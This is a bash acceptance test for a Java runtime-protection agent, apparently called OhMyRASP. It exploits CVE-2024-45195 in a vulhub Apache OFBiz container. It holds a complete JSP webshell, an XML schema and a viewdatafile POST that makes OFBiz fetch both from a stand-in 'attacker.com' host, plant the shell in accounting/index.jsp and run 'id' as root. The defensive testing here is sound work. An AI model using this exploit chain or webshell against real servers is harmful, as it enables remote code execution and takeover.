#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_OFBIZ_45195_IMAGE:-vulhub/ofbiz:18.12.15}"
baseline_name="${OHMYRASP_VULHUB_OFBIZ_45195_BASELINE_NAME:-ohmyrasp-vulhub-ofbiz45195-baseline}"
protected_name="${OHMYRASP_VULHUB_OFBIZ_45195_PROTECTED_NAME:-ohmyrasp-vulhub-ofbiz45195-protected}"
baseline_port="${OHMYRASP_VULHUB_OFBIZ_45195_BASELINE_PORT:-18460}"
protected_port="${OHMYRASP_VULHUB_OFBIZ_45195_PROTECTED_PORT:-18461}"
attacker_port="${OHMYRASP_VULHUB_OFBIZ_45195_ATTACKER_PORT:-18494}"
attacker_host="${OHMYRASP_VULHUB_OFBIZ_45195_ATTACKER_HOST:-attacker.com}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-ofbiz-18.12.15-45195-java8-baseline"
protected_dir="logs/vulhub-ofbiz-18.12.15-45195-java8-protected"
payload_dir="${baseline_dir}/http"
protected_log="${protected_dir}/events.jsonl"
exploit_path="/webtools/control/forgotPassword/viewdatafile"
webshell_path="./applications/accounting/webapp/accounting/index.jsp"
http_pid=""

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$payload_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
  if [[ -n "$http_pid" ]]; then
    kill "$http_pid" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

write_payloads() {
  cat > "${payload_dir}/rcereport.csv" <<'JSP'
<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>OhMyRASP</h1><br><% String getcmd = request.getParameter("cmd"); if (getcmd != null) { out.println("Command: " + getcmd + "<br>"); String[] cmd = new String[]{"/bin/sh","-c",getcmd}; Process p = Runtime.getRuntime().exec(cmd); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while (disr != null) { out.println(disr); disr = dis.readLine(); } } %>
JSP
  local payload_length
  payload_length="$(awk 'NR == 1 { print length; exit }' "${payload_dir}/rcereport.csv")"
  cat > "${payload_dir}/rceschema.xml" <<XML
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <data-file name="rce" separator-style="fixed-length" type-code="text" record-length="${payload_length}" start-line="0">
        <record name="rceentry" limit="many">
            <field name="jsp" type="String" length="${payload_length}" position="0"></field>
        </record>
    </data-file>
</data-files>
XML
  printf 'payload_length=%s\n' "$payload_length" >> "${baseline_dir}/attempts.log"
}

start_http_server() {
  write_payloads
  python3 -m http.server "$attacker_port" --bind 0.0.0.0 --directory "$payload_dir" \
    > "${baseline_dir}/http-server.log" 2>&1 &
  http_pid="$!"

  for attempt in $(seq 1 30); do
    if curl -fsS "http://127.0.0.1:${attacker_port}/rceschema.xml" >/dev/null 2>&1 \
      && curl -fsS "http://127.0.0.1:${attacker_port}/rcereport.csv" >/dev/null 2>&1; then
      printf 'http_server_ready_attempt=%s\n' "$attempt" >> "${baseline_dir}/attempts.log"
      return
    fi
    sleep 1
  done

  cat "${baseline_dir}/http-server.log" >&2 || true
  echo "temporary HTTP server did not expose OFBiz CVE-2024-45195 payloads on ${attacker_port}" >&2
  exit 1
}

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl -k --max-time 30 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_ofbiz() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "https://127.0.0.1:${port}/accounting")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "OFBiz container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "OFBiz did not expose /accounting at ${port}" >&2
  exit 1
}

viewdatafile_body() {
  local nonce="$1"
  printf 'DATAFILE_LOCATION=http://%s:%s/rcereport.csv?v=%s&DATAFILE_SAVE=%s&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://%s:%s/rceschema.xml?v=%s&DEFINITION_IS_URL=true&DEFINITION_NAME=rce' \
    "$attacker_host" "$attacker_port" "$nonce" "$webshell_path" \
    "$attacker_host" "$attacker_port" "$nonce"
}

post_viewdatafile() {
  local port="$1"
  local output="$2"
  local nonce="$3"
  local body
  body="$(viewdatafile_body "$nonce")"
  printf '%s' "$body" > "${output}.body"
  curl_status "$output" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "$body" \
    "https://127.0.0.1:${port}${exploit_path}"
}

wait_for_protected_startup() {
  for attempt in $(seq 1 180); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in OFBiz protected container" >&2
  exit 1
}

script_write_block_count() {
  grep -Ec '"algorithm":"java8_file_script_write".*"action":"block"' "$protected_log" || true
}

wait_for_script_write_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(script_write_block_count)"
    if (( count > previous )); then
      printf 'script_write_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java8_file_script_write block event for OFBiz CVE-2024-45195" >&2
  exit 1
}

assert_only_script_write_detection() {
  if grep -F '"event":"ohmyrasp-detection"' "$protected_log" \
    | grep -Fv '"algorithm":"java8_file_script_write"' >&2; then
    echo "protected OFBiz produced a non-file-write detection for CVE-2024-45195" >&2
    exit 1
  fi
}

run_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host="${attacker_host}:host-gateway" \
    -p "${baseline_port}:8443" \
    "$image" >/dev/null

  wait_for_ofbiz "$baseline_name" "$baseline_port" "$baseline_dir"

  local status
  status="$(post_viewdatafile "$baseline_port" "${baseline_dir}/viewdatafile-index.response" baseline)"
  printf 'baseline_viewdatafile_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]]; then
    cat "${baseline_dir}/viewdatafile-index.response" >&2 || true
    echo "baseline OFBiz did not accept the viewdatafile import request" >&2
    exit 1
  fi
  if ! docker exec "$baseline_name" grep -Fq "OhMyRASP" \
    /usr/src/apache-ofbiz/applications/accounting/webapp/accounting/index.jsp; then
    docker logs "$baseline_name" >&2 || true
    echo "baseline OFBiz did not write the JSP webshell to accounting/index.jsp" >&2
    exit 1
  fi

  status="$(curl_status "${baseline_dir}/index-id.response" \
    "https://127.0.0.1:${baseline_port}/accounting/index.jsp?cmd=id")"
  printf 'baseline_index_status=%s\n' "$status" >> "${baseline_dir}/attempts.log"
  if [[ "$status" != "200" ]] || ! grep -Fq "uid=0(root)" "${baseline_dir}/index-id.response"; then
    cat "${baseline_dir}/index-id.response" >&2 || true
    echo "baseline OFBiz did not execute id through the written JSP webshell" >&2
    exit 1
  fi

  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  docker run -d --name "$protected_name" \
    --add-host="${attacker_host}:host-gateway" \
    -p "${protected_port}:8443" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null

  wait_for_protected_startup
  wait_for_ofbiz "$protected_name" "$protected_port" "$protected_dir"
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "OFBiz protected startup produced a detection before CVE-2024-45195 traffic" >&2
    exit 1
  fi

  local previous_count
  local status
  previous_count="$(script_write_block_count)"
  status="$(post_viewdatafile "$protected_port" "${protected_dir}/viewdatafile-index.response" protected)"
  printf 'protected_viewdatafile_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  wait_for_script_write_block "$previous_count"
  assert_only_script_write_detection
  if docker exec "$protected_name" grep -Fq "OhMyRASP" \
    /usr/src/apache-ofbiz/applications/accounting/webapp/accounting/index.jsp; then
    docker exec "$protected_name" head -c 400 \
      /usr/src/apache-ofbiz/applications/accounting/webapp/accounting/index.jsp >&2 || true
    echo "protected OFBiz still wrote the JSP webshell to accounting/index.jsp" >&2
    exit 1
  fi

  status="$(curl_status "${protected_dir}/index-id.response" \
    "https://127.0.0.1:${protected_port}/accounting/index.jsp?cmd=id")"
  printf 'protected_index_status=%s\n' "$status" >> "${protected_dir}/attempts.log"
  if grep -Fq "uid=0(root)" "${protected_dir}/index-id.response"; then
    cat "${protected_dir}/index-id.response" >&2 || true
    echo "protected OFBiz still executed id through accounting/index.jsp" >&2
    exit 1
  fi
}

start_http_server
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f "$protected_name" >/dev/null 2>&1 || true

echo "vulhub OFBiz 18.12.15 CVE-2024-45195 Java8 acceptance passed"
